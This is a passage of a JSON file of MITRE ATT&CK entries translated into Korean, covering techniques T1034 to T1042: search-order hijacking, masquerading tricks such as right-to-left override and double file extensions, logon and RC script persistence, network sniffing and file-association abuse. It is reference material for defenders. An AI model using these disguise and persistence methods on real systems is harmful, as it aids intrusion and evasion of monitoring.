path</code>에 위치한 net.exe라는 이름의 프로그램이 명령줄에서 \"net\"을 실행할 때 Windows 시스템 \"net\" 대신 호출됩니다.\n\n### 검색 순서 탈취\n검색 순서 탈취는 공격자가 Windows가 경로를 지정하지 않은 프로그램을 검색하는 순서를 악용하는 경우 발생합니다. 검색 순서는 프로그램을 실행하는 데 사용된 방법에 따라 다릅니다. (출처: Microsoft CreateProcess) (출처: Hill NT Shell) (출처: Microsoft WinExec) 그러나 Windows는 일반적으로 initiating 프로그램의 디렉터리에서 Windows 시스템 디렉터리로 탐색하기 전에 검색합니다. 공격자는 검색 순서 탈취에 취약한 프로그램(즉, 실행 파일의 경로가 지정되지 않은 프로그램)을 찾아 이 취약점을 악용할 수 있으며, 부정확하게 지정된 프로그램의 이름을 가진 프로그램을 생성하여 initiating 프로그램의 디렉터리에 배치할 수 있습니다.\n\n예를 들어, \"example.exe\"가 <code>net user</code>라는 명령",
      "external_id": "T1034",
      "modified": "2020-07-06T18:49:35.645Z",
      "title": "Path Interception",
      "translated": true
    },
    {
      "description": "적대자는 서비스 제어 관리자와 같은 Windows 서비스와 상호 작용하는 방법을 통해 이진 파일, 명령 또는 스크립트를 실행할 수 있습니다. 이는 새로운 서비스를 생성하거나 기존 서비스를 수정함으로써 수행될 수 있습니다. 이 기술은 서비스 지속성 또는 권한 상승 중에 [새 서비스 생성](https://attack.mitre.org/techniques/T1050) 및 [기존 서비스 수정](https://attack.mitre.org/techniques/T1031)과 함께 사용되는 실행 방법입니다.",
      "external_id": "T1035",
      "modified": "2020-03-10T18:34:39.665Z",
      "title": "Service Execution",
      "translated": true
    },
    {
      "description": "공격자는 자신의 아티팩트의 기능을 조작하여 사용자 및/또는 보안 도구에 대해 합법적이거나 무해하게 보이도록 시도할 수 있습니다. 가장 위장(masquerading)은 합법적이거나 악의적인 객체의 이름이나 위치를 조작하거나 남용하여 방어 및 관찰을 피하려는 경우입니다. 여기에는 파일 메타데이터 조작, 사용자를 속여 파일 유형을 잘못 인식하게 하는 것, 합법적인 작업 또는 서비스 이름 부여 등이 포함될 수 있습니다.\n\n보안 모니터링을 회피하기 위해 악용 가능한 시스템 유틸리티의 이름을 변경하는 것도 [가장 위장(masquerading)](https://attack.mitre.org/techniques/T1036)의 한 형태입니다. (출처: LOLBAS 메인 사이트)",
      "external_id": "T1036",
      "modified": "2024-10-16T20:10:38.450Z",
      "title": "Masquerading",
      "translated": true
    },
    {
      "description": "적대자는 사용자, 분석가 또는 도구를 속일 가능성을 높이기 위해 유효한 코드 서명의 기능을 모방하려고 시도할 수 있습니다. 코드 서명은 개발자로부터 이진 코드의 진정성을 제공하고, 해당 이진 코드가 변조되지 않았다는 보장을 제공합니다. 적대자는 서명된 프로그램의 메타데이터와 서명 정보를 복사한 후 이를 무서명 프로그램의 템플릿으로 사용할 수 있습니다. 유효하지 않은 코드 서명이 있는 파일은 디지털 서명 검증을 통과하지 못하지만, 사용자에게는 더 합법적으로 보일 수 있으며 보안 도구가 이러한 파일을 잘못 처리할 수 있습니다.(출처: Threatexpress MetaTwin 2017)\n\n[코드 서명](https://attack.mitre.org/techniques/T1553/002)과 달리, 이 활동은 유효한 서명을 생성하지 않습니다.",
      "external_id": "T1036.001",
      "modified": "2020-02-10T19:52:47.724Z",
      "title": "Invalid Code Signature",
      "translated": true
    },
    {
      "description": "적대자들은 오른쪽에서 왼쪽으로 덮어쓰기(RTLO 또는 RLO) 문자(U+202E)를 악용하여 문자열 및/또는 파일 이름을 위장하여 평범해 보이게 만들 수 있습니다. RTLO는 비인쇄 유니코드 문자로, 그 뒤에 오는 텍스트가 뒤집혀 표시되도록 합니다. 예를 들어, `<code>March 25 \\u202Excod.scr</code>`라는 이름의 Windows 스크린 세이버 실행 파일은 `<code>March 25 rcs.docx</code>`로 표시됩니다. `<code>photo_high_re\\u202Egnp.js</code>`라는 이름의 JavaScript 파일은 `<code>photo_high_resj.png</code>`로 표시됩니다. (출처: Infosecinstitute RTLO 기법)\n\n적대자들은 RTLO 문자를 사용하여 사용자가 무해한 파일 유형으로 생각하게 하여 실행하도록 속일 수 있습니다. 이 기술의 일반적인 사용 사례는 [스피어피싱 첨부 파일](https://attack.mitre.org/techniques/T1566/001)/[악성 파일](https://attack.mitre.org/techniques/T1204/002)과 관련이 있으며, 이는 사용자가 RTLO 문자를 표시하거나 렌더링하는 방법에 대해 알지 못할 경우 최종 사용자와 방어자 모두를 속일 수 있습니다. RTLO 사용은 여러 차단된 침입 시도 및 범죄 활동에서 관찰되었습니다. (출처: Trend Micro PLEAD RTLO) (출처: Kaspersky RTLO 사이버 범죄) RTLO는 Windows 레지스트리에서도 사용할 수 있으며, regedit.exe는 뒤집힌 문자를 표시하지만 command line 도구인 reg.exe는 기본적으로는 표시하지 않습니다.",
      "external_id": "T1036.002",
      "modified": "2021-10-14T21:01:59.733Z",
      "title": "Right-to-Left Override",
      "translated": true
    },
    {
      "description": "공격자는 정당한 시스템 유틸리티의 이름을 변경하여 이러한 유틸리티 사용에 대한 보안 메커니즘을 회피하려 할 수 있습니다. 공격자가 악용할 수 있는 시스템 유틸리티에 대해 보안 모니터링 및 제어 메커니즘이 마련되어 있을 수 있습니다. (출처: LOLBAS 메인 사이트) 유틸리티를 사용하기 전에 이름을 변경함으로써 이러한 보안 메커니즘을 우회할 수 있을 가능성이 있습니다 (예: <code>rundll32.exe</code> 이름 변경). (출처: Elastic Masquerade Ball) 또 다른 경우는 정당한 유틸리티가 다른 디렉토리로 복사되거나 이동되고 이름이 변경되어 비정상 경로에서 실행되는 시스템 유틸리티를 기반으로 한 탐지를 피하는 경우입니다. (출처: F-Secure CozyDuke)",
      "external_id": "T1036.003",
      "modified": "2024-09-12T19:30:45.065Z",
      "title": "Rename System Utilities",
      "translated": true
    },
    {
      "description": "적대자는 작업 또는 서비스의 이름을 조작하여 이를 합법적이거나 무해하게 보이도록 시도할 수 있습니다. 작업 스케줄러 또는 systemd에 의해 실행되는 작업/서비스는 일반적으로 이름 및/또는 설명이 부여됩니다. (인용: TechNet Schtasks) (인용: Systemd Service Units) Windows 서비스는 서비스 이름과 표시 이름을 가지게 됩니다. 일반적으로 사용되는 이름을 가진 무해한 작업 및 서비스가 많이 존재합니다. 적대자는 작업 또는 서비스에 합법적인 것과 유사하거나 동일한 이름을 부여할 수 있습니다.\n\n작업 또는 서비스에는 설명과 같은 다른 필드가 포함되어 있으며, 적대자는 이러한 필드를 합법적으로 보이도록 조작하려고 시도할 수 있습니다. (인용: Palo Alto Shamoon Nov 2016) (인용: Fysbis Dr Web Analysis)",
      "external_id": "T1036.004",
      "modified": "2023-09-29T20:30:58.300Z",
      "title": "Masquerade Task or Service",
      "translated": true
    },
    {
      "description": "위협 행위자는 방어 및 관찰을 피하기 위해 합법적인 파일이나 자원의 이름 또는 위치를 일치시키거나 근사할 수 있습니다. 이를 위해 일반적으로 신뢰되는 디렉토리(예: System32) 내에 실행 파일을 배치하거나 합법적이고 신뢰할 수 있는 프로그램의 이름(예: svchost.exe)을 부여할 수 있습니다. 컨테이너화된 환경에서는 컨테이너 포드 또는 클러스터의 명명 규칙과 일치하는 네임스페이스에 리소스를 생성하여 이와 같은 작업을 수행할 수도 있습니다. 또는 주어진 파일 또는 컨테이너 이미지 이름이 합법적인 프로그램/이미지 또는 무해한 것과 거의 비슷한 경우일 수 있습니다.\n\n위협 행위자는 또한 모방하려는 파일의 동일한 아이콘을 사용할 수 있습니다.",
      "external_id": "T1036.005",
      "modified": "2024-09-12T19:30:45.064Z",
      "title": "Match Legitimate Name or Location",
      "translated": true
    },
    {
      "description": "공격자는 파일의 확장자를 변경하여 프로그램의 실제 파일 유형을 숨길 수 있습니다. 특정 파일 유형(특히 .app 확장자는 제외)에서는 파일 이름 끝에 공백을 추가하면 운영 체제가 파일을 처리하는 방식이 변경됩니다.\n\n예를 들어, <code>evil.bin</code>이라는 Mach-O 실행 파일이 있을 경우 사용자가 이 파일을 두 번 클릭하면 Terminal.app이 실행되어 파일이 실행됩니다. 이 파일의 이름을 <code>evil.txt</code>로 변경하면 사용자가 두 번 클릭할 경우 기본 텍스트 편집 애플리케이션이 실행되며 (이진 파일은 실행되지 않음) 그러나 파일 이름을 <code>evil.txt </code>로 변경하면(끝에 공백 주목) 사용자가 두 번 클릭할 경우 운영 체제에 의해 실제 파일 유형이 결정되고 적절히 처리되어 이진 파일이 실행됩니다 (인용: Mac 백도어가 돌아왔다).\n\n공격자는 이 기능을 이용하여 사용자들이 아무 형식의 무해해 보이는 파일을 두 번 클릭하도록 유도하고 궁극적으로 악성 코드를 실행하도록 만들 수 있습니다.",
      "external_id": "T1036.006",
      "modified": "2023-03-30T21:01:52.873Z",
      "title": "Space after Filename",
      "translated": true
    },
    {
      "description": "공격자는 파일 이름에서 이중 확장자를 악용하여 실제 파일 유형을 가장할 수 있습니다. 파일 이름에는 두 번째 파일 형식 확장이 포함될 수 있으며, 이로 인해 첫 번째 확장자만 표시될 수 있습니다(예: `<code>File.txt.exe</code>`는 일부 보기에서는 단지 `<code>File.txt</code>`로 렌더링될 수 있습니다). 그러나 두 번째 확장자는 파일이 열리고 실행되는 방식을 결정하는 실제 파일 유형입니다. 실제 파일 확장은 파일 탐색기(예: explorer.exe)에서 운영 체제에 의해 숨겨질 수 있으며, 시스템 정책에 따라 구성된 소프트웨어에서도 마찬가지입니다.(인용: PCMag DoubleExtension)(인용: SOCPrime DoubleExtension)\n\n공격자는 이중 확장을 악용하여 페이로드의 위험한 파일 유형을 숨기려 할 수 있습니다. 매우 일반적인 사용 사례는 사용자를 속여 무해한 파일 유형으로 생각하게 하지만 실제로는 실행 코드인 파일을 여는 것입니다. 이러한 파일은 종종 이메일 첨부 파일로 가장하며 공격자가 [초기 접근](https://attack.mitre.org/tactics/TA0001)을 얻는 데 도움을 줍니다, 예를 들어 [스피어 피싱 첨부파일](https://attack.mitre.org/techniques/T1566/001)을 통해 그 다음 [사용자 실행](https://attack.mitre.org/techniques/T1204)됩니다. 예를 들어, `<code>Evil.txt.exe</code>`라는 이름의 실행 파일 첨부파일은 사용자에게 `<code>Evil.txt</code>`로 표시될 수 있습니다. 사용자는 이를 무해한 텍스트 파일로 보고 열게 되어, 의도치 않게 숨겨진 악성 코드를 실행하게 됩니다.(인용: SOCPrime DoubleExtension)\n\n일반적인 파일 형식인 텍스트 파일 (.txt, .doc 등) 및 이미지 파일 (.jpg, .gif 등)은 보통 첫 번째 확장자로 사용되어 무해해 보이도록 합니다. .exe, .lnk, .hta 및 .scr와 같은 위험한 것으로 간주되는 실행 확장자는 종종 두 번째 확장자이자 실제 파일 유형으로 나타납니다.",
      "external_id": "T1036.007",
      "modified": "2021-10-14T21:09:59.588Z",
      "title": "Double File Extension",
      "translated": true
    },
    {
      "description": "적대자는 악성 페이로드를 파일의 서명, 확장자 및 내용 등 페이로드 형식을 변경함으로써 합법적인 파일로 가장할 수 있습니다. 다양한 파일 형식은 일반적으로 표준 형식이 있으며, 인코딩 및 구성 방식이 포함됩니다. 예를 들어, 파일의 서명(헤더 또는 매직 바이트라고도 함)은 파일의 시작 바이트로, 파일 유형을 식별하는 데 자주 사용됩니다. JPEG 파일의 경우 헤더는 <code> 0xFF 0xD8</code>이며, 파일 확장자는 `.JPE`, `.JPEG` 또는 `.JPG`입니다. \n\n적대자는 악성 페이로드의 헤더의 헥스 코드를 편집하거나 파일 확장자를 변경하여 파일 유효성 검사 및/또는 입력 위생 검사를 우회할 수 있습니다. 이러한 행동은 페이로드 파일이 전송될 때(예: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) 및 저장될 때(예: [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) 흔히 사용되어 적대자가 탐지를 유발하지 않고 자신의 맬웨어를 이동할 수 있도록 합니다. \n\n일반적인 비실행 파일 형식 및 확장자(예: 텍스트 파일(`.txt`), 이미지 파일(`.jpg`, `.gif` 등))는 일반적으로 무해한 것으로 간주될 수 있습니다. 이에 따라 적대자는 파일 확장자를 사용하여 맬웨어를 숨길 수 있으며, 예를 들어 PHP 백도어 코드를 <code>test.gif</code>라는 파일 이름으로 명명할 수 있습니다. 사용자는 무해한 외관과 파일 확장자 때문에 해당 파일이 악성이라는 사실을 알지 못할 수 있습니다.\n\n파일 유형이 다수 존재하고 상이한 응용 프로그램에 따라 다르게 작동하는 폴리갓 파일도 악성 맬웨어와 기능을 숨기기 위해 사용할 수 있습니다.(인용: polygot_icedID)",
      "external_id": "T1036.008",
      "modified": "2023-06-14T23:03:51.540Z",
      "title": "Masquerade File Type",
      "translated": true
    },
    {
      "description": "적대 세력은 실행된 악성코드의 부모 프로세스 ID(PPID)를 수정하여 프로세스 트리 기반 분석을 회피하려고 할 수 있습니다. 엔드포인트 보호 소프트웨어가 탐지를 위해 '부모-자식' 관계를 활용하는 경우, 이 관계를 끊으면 공격자의 행동이 이전 프로세스 트리 활동과 연관되지 않을 수 있습니다. 유닉스 기반 시스템에서는 관리자들이 스크립트 및 프로그램을 사용하여 소프트웨어를 실행할 때 이러한 프로세스 트리를 끊는 것이 일반적인 관행입니다.(인용: 3OHA double-fork 2022)\n\n리눅스 시스템에서 공격자는 악성코드의 프로세스 트리를 변경하기 위해 일련의 [네이티브 API](https://attack.mitre.org/techniques/T1106) 호출을 실행할 수 있습니다. 예를 들어, 공격자는 인수 없이 페이로드를 실행한 다음 `fork()` API 호출을 두 번 실행하고, 부모 프로세스가 종료되도록 할 수 있습니다. 이렇게 하면 부모 프로세스가 없는 손자 프로세스가 생성되고, 이 프로세스는 즉시 `init` 시스템 프로세스(PID 1)에 의해 채택되어 공격자의 페이로드 실행이 이전 프로세스 트리와 성공적으로 분리됩니다.\n\n또 다른 예로는 \"daemon\" 시스템 호출을 사용하여 현재의 부모 프로세스에서 분리되고 백그라운드에서 실행되는 방식이 있습니다.(인용: Sandfly BPFDoor 2022)(인용: Microsoft XorDdos Linux Stealth 2022)",
      "external_id": "T1036.009",
      "modified": "2023-10-03T04:06:42.256Z",
      "title": "Break Process Trees",
      "translated": true
    },
    {
      "description": "적대자는 새로 생성된 계정이 무해해 보이도록 합법적인 계정의 이름을 일치시키거나 유사하게 만들 수 있습니다. 이는 [계정 생성](https://attack.mitre.org/techniques/T1136) 과정에서 주로 발생하지만, 나중에 계정 이름을 변경할 수도 있습니다. 또한 이는 [계정 접근 제거](https://attack.mitre.org/techniques/T1531)와 일치할 수 있으며, 공격자가 기존 계정을 삭제한 후 동일한 이름으로 재생성하는 경우에 해당합니다.(출처: Huntress MOVEit 2023)\n\n종종 적대자는 합법적인 소프트웨어, 데이터 백업 및 컨테이너 클러스터 관리와 관련된 서비스 계정을 가장하려고 합니다.(출처: Elastic CUBA 랜섬웨어 2022)(출처: Aquasec Kubernetes 공격 2023) 그들은 또한 \"admin\", \"help\" 또는 \"root\"와 같은 일반적이고 신뢰할 수 있는 이름을 계정에 부여할 수 있습니다.(출처: Invictus IR Cloud 랜섬웨어 2024) 때때로 적대자는 [계정 검색](https://attack.mitre.org/techniques/T1087) 후속 행동으로 시스템에 이미 존재하는 계정 이름을 모델링할 수 있습니다. \n\n이것은 특정 신뢰할 수 있는 개인이나 조직을 가장하는 [가장](https://attack.mitre.org/techniques/T1656)와는 다른 점에 유의해야 하며, 이는 사용자나 서비스 계정 이름이 아닌 것입니다.",
      "external_id": "T1036.010",
      "modified": "2024-10-17T15:20:36.705Z",
      "title": "Masquerade Account Name",
      "translated": true
    },
    {
      "description": "적대적인 행위자는 부팅 또는 로그온 초기화 시 자동으로 실행되는 스크립트를 사용하여 지속성을 유지할 수 있습니다. (출처: Mandiant APT29 Eye Spy Email Nov 22)(출처: Anomali Rocke March 2019) 초기화 스크립트는 관리 기능을 수행하는 데 사용될 수 있으며, 종종 다른 프로그램을 실행하거나 내부 로깅 서버로 정보를 전송할 수 있습니다. 이러한 스크립트는 운영 체제와 로컬 또는 원격 적용 여부에 따라 달라질 수 있습니다.  \n\n적대적인 행위자는 이러한 스크립트를 사용하여 단일 시스템에서 지속성을 유지할 수 있습니다. 로그온 스크립트의 접근 구성에 따라 로컬 자격 증명이나 관리자 계정이 필요할 수 있습니다. \n\n또한 적대적인 행위자는 일부 부팅 또는 로그온 초기화 스크립트가 더 높은 권한으로 실행되기 때문에 권한 상승을 시도할 수도 있습니다.",
      "external_id": "T1037",
      "modified": "2024-04-16T12:23:13.621Z",
      "title": "Boot or Logon Initialization Scripts",
      "translated": true
    },
    {
      "description": "위협 행위자는 로그인 초기화 시 자동으로 실행되는 Windows 로그온 스크립트를 사용하여 지속성을 확립할 수 있습니다. Windows는 특정 사용자 또는 사용자 그룹이 시스템에 로그인할 때마다 로그온 스크립트를 실행할 수 있도록 허용합니다. (출처: TechNet 로그온 스크립트) 이는 <code>HKCU\\Environment\\UserInitMprLogonScript</code> 레지스트리 키에 스크립트 경로를 추가함으로써 이루어집니다. (출처: Hexacorn 로그온 스크립트)\n\n위협 행위자는 이러한 스크립트를 사용하여 단일 시스템에서 지속성을 유지할 수 있습니다. 로그온 스크립트의 접근 구성에 따라, 로컬 자격 증명이나 관리자 계정이 필요할 수 있습니다.",
      "external_id": "T1037.001",
      "modified": "2020-03-24T23:45:03.153Z",
      "title": "Logon Script (Windows)",
      "translated": true
    },
    {
      "description": "해커는 사용자가 로그온할 때 실행되는 지속성을 확립하기 위해 로그인 훅(Login Hook)을 사용할 수 있습니다. 로그인 훅은 사용자가 로그인 할 때 루트 권한으로 실행할 특정 스크립트를 가리키는 plist 파일입니다. 이 plist 파일은 `<code>/Library/Preferences/com.apple.loginwindow.plist</code>` 파일에 위치하며, `<code>defaults</code>` 명령어 유틸리티를 사용하여 수정할 수 있습니다. 이 행동은 사용자가 로그아웃할 때 스크립트를 실행할 수 있는 로그아웃 훅(Logout Hook)에도 동일하게 적용됩니다. 모든 훅은 수정이나 생성을 위해 관리자 권한이 필요합니다.(출처: Login Scripts Apple Dev)(출처: LoginWindowScripts Apple Dev)\n\n해커는 `<code>com.apple.loginwindow.plist</code>` 파일에 악성 스크립트의 경로를 추가하거나 삽입할 수 있으며, 이때 `<code>LoginHook</code>` 또는 `<code>LogoutHook</code>` 키-값 쌍을 사용할 수 있습니다. 악성 스크립트는 다음 사용자 로그온 시 실행됩니다. 만약 로그인 훅이 이미 존재하는 경우, 해커는 기존의 로그인 훅에 추가 명령을 삽입할 수 있습니다. 시스템에서는 한 번에 하나의 로그인 훅과 로그아웃 훅만 존재할 수 있습니다.(출처: S1 macOS Persistence)(출처: Wardle Persistence Chapter)\n\n**참고:** 로그인 훅은 macOS 10.11 버전에서 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) 및 [Launch Agent](https://attack.mitre.org/techniques/T1543/001)으로 대체되었습니다.",
      "external_id": "T1037.002",
      "modified": "2022-04-20T16:42:05.094Z",
      "title": "Login Hook",
      "translated": true
    },
    {
      "description": "적대자는 로그인 초기화 시 자동으로 실행되는 네트워크 로그인 스크립트를 사용하여 지속성을 유지할 수 있습니다. 네트워크 로그인 스크립트는 Active Directory 또는 그룹 정책 개체(GPO)를 사용하여 할당될 수 있습니다. (인용: Petri 로그인 스크립트 AD) 이러한 로그인 스크립트는 할당된 사용자의 권한으로 실행됩니다. 네트워크 내 시스템에 따라 이러한 스크립트 중 하나를 초기화하면 여러 시스템에 적용되거나 모든 시스템에 적용될 수 있습니다.\n\n적대자는 이러한 스크립트를 사용하여 네트워크에서 지속성을 유지할 수 있습니다. 로그인 스크립트의 접근 구성에 따라 로컬 자격 증명이나 관리자 계정이 필요할 수 있습니다.",
      "external_id": "T1037.003",
      "modified": "2020-03-24T23:45:25.625Z",
      "title": "Network Logon Script",
      "translated": true
    },
    {
      "description": "공격자는 Unix 유사 시스템의 시작 시 실행되는 RC 스크립트를 수정하여 지속성을 확립할 수 있습니다. 이러한 파일은 시스템 관리자가 서로 다른 실행 레벨에 대해 사용자 정의 서비스를 매핑하고 시작할 수 있도록 합니다. RC 스크립트를 수정하려면 루트 권한이 필요합니다.\n\n공격자는 Unix 유사 배포판에서 <code>rc.local</code>, <code>rc.common</code> 및 기타 RC 스크립트에 악성 바이너리 경로 또는 셸 명령을 추가함으로써 지속성을 확립할 수 있습니다. (출처: IranThreats Kittens 2017년 12월)(출처: Intezer HiddenWasp Map 2019) 시스템이 재부팅되면 스크립트의 내용이 루트로 실행되어 지속성이 유지됩니다.\n\nRC 스크립트의 악용은 IoT 또는 임베디드 시스템과 같이 기본적으로 루트 사용자로 설정된 경량 Unix 유사 배포판에서 특히 효과적입니다. (출처: intezer-kaiji-malware)\n\n여러 Unix 유사 시스템은 Systemd로 전환하였고 RC 스크립트의 사용을 더 이상 권장하지 않습니다. 현재 macOS에서는 [Launchd](https://attack.mitre.org/techniques/T1053/004)를 선호하여 이 메커니즘이 더 이상 사용되지 않고 있습니다. (출처: Apple Developer Doco Archive Launchd)(출처: Startup Items) 이 기술은 여전히 RC 스크립트를 실행하는 Mac OS X Panther v10.3 및 이전 버전에서 사용할 수 있습니다. (출처: Mac 악성코드 지속성 방법) 일부 시스템, 예를 들어 Ubuntu와 같은 경우, 호환성을 유지하기 위해 올바른 파일 권한을 가진 RC 스크립트가 존재할 경우 이를 실행합니다. (출처: Ubuntu Manpage systemd rc)",
      "external_id": "T1037.004",
      "modified": "2024-04-16T12:22:29.150Z",
      "title": "RC Scripts",
      "translated": true
    },
    {
      "description": "공격자는 부팅 초기화 시 자동으로 실행되는 스타트업 항목을 사용하여 지속성을 확보할 수 있습니다. 스타트업 항목은 부팅 프로세스의 마지막 단계에서 실행되며, 셸 스크립트 또는 기타 실행 파일과 시스템이 모든 스타트업 항목의 실행 순서를 결정하는 데 사용하는 구성 정보가 포함되어 있습니다.\n\n이 기술은 기술적으로 더 이상 사용되지 않으며 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)에 의해 대체되었습니다. 따라서 <code>/Library/StartupItems</code> 폴더가 시스템에 기본적으로 존재할 것이라고 보장할 수는 없지만, macOS Sierra에서는 기본적으로 존재하는 것으로 보입니다. 스타트업 항목은 실행 파일과 구성 속성 목록(plist)인 <code>StartupParameters.plist</code>가 최상위 디렉토리에 위치한 디렉터리입니다.\n\n공격자는 스타트업 항목 디렉토리 내에 필요한 폴더/파일을 생성하여 자신만의 지속성 메커니즘을 등록할 수 있습니다. 추가로, 스타트업 항목은 macOS의 부팅 단계에서 실행되므로 상승된 루트 사용자로 실행됩니다.",
      "external_id": "T1037.005",
      "modified": "2022-04-20T16:43:21.560Z",
      "title": "Startup Items",
      "translated": true
    },
    {
      "description": "Windows 시스템은 프로그램에 로드할 필수 DLL을 찾기 위해 일반적인 방법을 사용합니다. (출처: Microsoft DLL Search) 공격자는 Windows DLL 검색 순서와 모호하게 지정된 DLL을 포함한 프로그램을 이용하여 권한 상승과 지속성을 획득할 수 있습니다.\n\n공격자는 모호하게 지정된 DLL과 같은 이름의 악성 DLL을 정당한 DLL보다 먼저 검색하는 위치에 배치하여 DLL 사전 로딩, 또는 이진 식재 공격(출처: OWASP Binary Planting)을 수행할 수 있습니다. 이 위치는 종종 프로그램의 현재 작업 디렉토리입니다. 원격 DLL 사전 로딩 공격은 프로그램이 DLL을 로드하기 전에 현재 디렉토리를 웹 공유와 같은 원격 위치로 설정할 때 발생합니다. (출처: Microsoft 2269637) 공격자는 이 행동을 이용하여 프로그램이 악성 DLL을 로드하도록 할 수 있습니다.\n\n공격자는 기존 DLL을 교체하거나 .manifest 또는 .local 리다이렉션 파일, 디렉토리, 또는 정점을 수정하여 프로그램이 다른 DLL을 로드하도록 하여 지속성이나 권한 상승을 유지할 수 있습니다. (출처: Microsoft DLL Redirection) (출처: Microsoft Manifests) (출처: Mandiant Search Order)\n\n검색 순서에 취약한 프로그램이 더 높은 권한 수준에서 실행되도록 구성되어 있다면, 공격자가 제어하는 DLL도 높은 수준에서 실행될 것입니다. 이 경우, 이 기술은 사용자에서 관리자 또는 SYSTEM으로 또는 관리자로부터 SYSTEM으로의 권한 상승에 사용될 수 있습니다.\n\n경로 하이재킹의 피해를 입은 프로그램은 악성 DLL이 정당한 DLL도 로드하도록 구성될 수 있기 때문에 정상적으로 작동하는 것처럼 보일 수 있습니다.",
      "external_id": "T1038",
      "modified": "2020-03-26T14:49:47.091Z",
      "title": "DLL Search Order Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 자신이 침해한 컴퓨터에서 네트워크 공유를 검색하여 관심 있는 파일을 찾을 수 있습니다. 민감한 데이터는 현재 시스템에서 접근 가능한 공유 네트워크 드라이브(호스트 공유 디렉토리, 네트워크 파일 서버 등)를 통해 원격 시스템에서 수집될 수 있으며, 이는 유출 이전에 이루어집니다. 인터랙티브 명령 쉘이 사용되고 있을 수 있으며, [cmd](https://attack.mitre.org/software/S0106) 내의 일반적인 기능을 사용하여 정보를 수집할 수 있습니다.",
      "external_id": "T1039",
      "modified": "2023-08-11T21:06:07.690Z",
      "title": "Data from Network Shared Drive",
      "translated": true
    },
    {
      "description": "적대 세력은 네트워크 트래픽을 수동으로 스니핑하여 인증 자료를 포함한 환경에 대한 정보를 캡처할 수 있습니다. 네트워크 스니핑은 시스템의 네트워크 인터페이스를 사용하여 유선 또는 무선 연결을 통해 전송되는 정보를 모니터링하거나 캡처하는 것을 의미합니다. 적대자는 네트워크의 데이터에 수동적으로 접근하기 위해 네트워크 인터페이스를 프로미스큐어스 모드로 설정하거나, 스팬 포트를 사용하여 더 많은 양의 데이터를 캡처할 수 있습니다.\n\n이 기술을 통해 캡처된 데이터에는 특히 안전하지 않은 비암호화 프로토콜을 통해 전송된 사용자 자격 증명이 포함될 수 있습니다. 이름 서비스 해상도 오염 기법인 [LLMNR/NBT-NS 오염 및 SMB 릴레이](https://attack.mitre.org/techniques/T1557/001)와 같은 방법도 트래픽을 적대자에게 리디렉션함으로써 웹 사이트, 프록시 및 내부 시스템에 대한 자격 증명을 캡처하는 데 사용될 수 있습니다.\n\n네트워크 스니핑은 실행 중인 서비스, 버전 번호 및 이후 [측면 이동](https://attack.mitre.org/tactics/TA0008) 및/또는 [방어 회피](https://attack.mitre.org/tactics/TA0005) 활동에 필요한 기타 네트워크 특성과 같은 구성 세부정보를 드러낼 수 있습니다. 적대자는 또한 [중간의 적대자](https://attack.mitre.org/techniques/T1557) (AiTM) 활동 중에 네트워크 스니핑을 이용하여 환경에 대한 추가 지식을 수동적으로 얻을 수 있습니다.\n\n클라우드 기반 환경에서도 적대자는 가상 머신에서 네트워크 트래픽을 스니핑하기 위해 트래픽 미러링 서비스를 사용할 수 있습니다. 예를 들어, AWS 트래픽 미러링, GCP 패킷 미러링, Azure vTap은 사용자가 트래픽을 수집할 특정 인스턴스와 수집된 트래픽을 보낼 특정 대상을 정의할 수 있게 합니다.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) 이러한 트래픽의 대부분은 TLS 종료가 로드 밸런서 수준에서 이루어지기 때문에 일반 텍스트로 존재할 수 있습니다. 이는 트래픽의 암호화 및 복호화의 부담을 줄이기 위한 것입니다.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) 그러면 적대자는 데이터 유출 기법인 클라우드 계정으로 데이터 전송을 사용하여 스니핑된 트래픽에 접근할 수 있습니다.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\n네트워크 장치에서 적대자는 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령어인 `monitor capture`를 사용하여 네트워크 캡처를 수행할 수 있습니다.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
      "external_id": "T1040",
      "modified": "2024-10-15T15:11:55.217Z",
      "title": "Network Sniffing",
      "translated": true
    },
    {
      "description": "적대자는 기존의 명령 및 제어 채널을 통해 데이터를 탈취할 수 있습니다. 도용된 데이터는 명령 및 제어 통신과 동일한 프로토콜을 사용하여 일반 통신 채널에 인코딩됩니다.",
      "external_id": "T1041",
      "modified": "2023-04-07T17:09:14.040Z",
      "title": "Exfiltration Over C2 Channel",
      "translated": true
    },
    {
      "description": "파일이 열릴 때, 파일을 여는 데 사용되는 기본 프로그램(파일 연결 또는 핸들러라고도 함)이 확인됩니다. 파일 연결 선택은 Windows 레지스트리에 저장되며, 사용자, 관리자 또는 레지스트리 접근 권한이 있는 프로그램에 의해 수정될 수 있습니다(인용: Microsoft Change Default Programs)(인용: Microsoft File Handlers) 또는 관리자에 의해 내장된 assoc 유틸리티를 사용하여 수정될 수 있습니다(인용: Microsoft Assoc Oct 2017). 응용 프로그램은 특정 파일 확장자에 대한 파일 연결을 수정하여 해당 확장자를 가진 파일이 열릴 때 임의의 프로그램을 호출할 수 있습니다.\n\n시스템 파일 연결은 <code>HKEY_CLASSES_ROOT\\.[extension]</code> 아래에 나열됩니다. 예를 들어 <code>HKEY_CLASSES_ROOT\\.txt</code>가 있습니다. 항목은 그 확장자에 대한 핸들러를 가리키며 이는 <code>HKEY_CLASSES_ROOT\\[handler]</code>에 위치합니다. 다양한 명령은 이후 <code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>의 쉘 키 아래에 하위 키로 나열됩니다. 예를 들어:\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n나열된 키의 값은 핸들러가 파일 확장자를 열 때 실행되는 명령입니다. 공격자는 이러한 값을 수정하여 임의의 명령이 지속적으로 실행되도록 할 수 있습니다(인용: TrendMicro TROJ-FAKEAV OCT 2012).",
      "external_id": "T1042",
      "modified": "2020-01-24T13:41:32.520Z",
